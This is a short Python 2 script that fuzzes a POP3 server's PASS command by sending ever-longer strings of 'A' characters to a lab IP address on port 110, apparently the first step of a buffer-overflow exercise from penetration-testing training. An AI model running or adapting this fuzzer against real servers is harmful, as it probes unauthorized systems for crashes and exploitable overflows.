#!/usr/bin/python
import socket

buffer=["A"]
counter=100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter = counter+200

for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.22.131', 110))
	s.recv(1024)
	s.send('USER test\n')
	s.recv(1024)
	s.send('PASS ' + string + '\n')
	s.send('QUIT\n')
	s.close
